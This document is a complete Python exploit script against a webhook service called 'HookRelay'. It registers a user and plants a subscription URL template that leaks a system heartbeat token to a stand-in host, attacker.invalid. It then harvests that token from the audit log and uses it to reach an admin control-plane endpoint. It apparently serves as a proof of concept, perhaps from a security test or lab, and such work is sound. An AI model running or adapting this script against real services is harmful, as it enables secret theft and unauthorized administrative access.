#!/usr/bin/env python3
import argparse
import json
import random
import re
import ssl
import string
import time
import urllib.error
import urllib.request
from pathlib import Path


TOKEN_RE = re.compile(r"https://attacker\.invalid/hb/([0-9a-f]{48})\b")


def save_json(evidence_dir: Path | None, name: str, data) -> None:
    if not evidence_dir:
        return
    evidence_dir.mkdir(parents=True, exist_ok=True)
    path = evidence_dir / name
    path.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n")


def request_json(base_url, path, method="GET", data=None, token=None,
                 headers=None, context=None):
    req_headers = {"Accept": "application/json"}
    if headers:
        req_headers.update(headers)

    body = None
    if data is not None:
        body = json.dumps(data).encode()
        req_headers["Content-Type"] = "application/json"

    if token:
        req_headers["Authorization"] = f"Bearer {token}"

    req = urllib.request.Request(
        base_url.rstrip("/") + path,
        data=body,
        headers=req_headers,
        method=method,
    )

    try:
        with urllib.request.urlopen(req, timeout=20, context=context) as resp:
            raw = resp.read().decode()
            return json.loads(raw)
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode(errors="replace")
        try:
            parsed = json.loads(raw)
        except json.JSONDecodeError:
            parsed = raw
        raise RuntimeError(f"{method} {path} returned HTTP {exc.code}: {parsed}") from exc


def random_username():
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits)
                     for _ in range(8))
    return f"ctk_{int(time.time())}_{suffix}"


def main():
    parser = argparse.ArgumentParser(
        description="Exploit HookRelay heartbeat-token leakage through audit logs.",
    )
    parser.add_argument("base_url", help="Target base URL, for example https://host")
    parser.add_argument("--insecure", action="store_true",
                        help="Disable TLS certificate validation.")
    parser.add_argument("--evidence-dir",
                        help="Directory where JSON evidence files will be written.")
    parser.add_argument("--timeout", type=int, default=75,
                        help="Seconds to wait for the next heartbeat.")
    args = parser.parse_args()

    context = ssl._create_unverified_context() if args.insecure else None
    evidence_dir = Path(args.evidence_dir) if args.evidence_dir else None

    username = random_username()
    print(f"[+] Registering normal user: {username}")
    register = request_json(
        args.base_url,
        "/api/auth/register",
        method="POST",
        data={"username": username},
        context=context,
    )
    save_json(evidence_dir, "01_register.json", register)
    jwt = register["token"]

    print("[+] Creating subscription with a URL template that references the event context")
    subscription = request_json(
        args.base_url,
        "/api/v2/subscriptions",
        method="POST",
        token=jwt,
        data={
            "name": "heartbeat-leak",
            "url_template": "https://attacker.invalid/hb/{{actor.context.continuation_id}}",
            "filter": "user.*",
        },
        context=context,
    )
    save_json(evidence_dir, "02_subscription.json", subscription)

    print("[+] Polling tenant audit log until a system.heartbeat row is rendered")
    deadline = time.time() + args.timeout
    heartbeat_entry = None
    heartbeat_token = None
    last_logs = []

    while time.time() < deadline:
        last_logs = request_json(
            args.base_url,
            "/api/v2/audit/dispatches",
            token=jwt,
            context=context,
        )
        for entry in last_logs:
            rendered_url = entry.get("rendered_url", "")
            match = TOKEN_RE.search(rendered_url)
            if entry.get("event_type") == "system.heartbeat" and match:
                heartbeat_entry = entry
                heartbeat_token = match.group(1)
                break
        if heartbeat_token:
            break
        time.sleep(1)

    save_json(evidence_dir, "03_last_audit_poll.json", last_logs)
    if heartbeat_entry:
        save_json(evidence_dir, "04_heartbeat_leak.json", heartbeat_entry)

    if not heartbeat_token:
        raise SystemExit("[-] Timed out before a rendered heartbeat token appeared")

    print(f"[+] Leaked heartbeat token: {heartbeat_token}")
    print("[+] Calling the control-plane endpoint with X-Heartbeat-Token")
    control = request_json(
        args.base_url,
        "/api/v2/admin/control",
        headers={"X-Heartbeat-Token": heartbeat_token},
        context=context,
    )
    save_json(evidence_dir, "05_control_plane.json", control)

    print(json.dumps(control, indent=2, sort_keys=True))


if __name__ == "__main__":
    main()
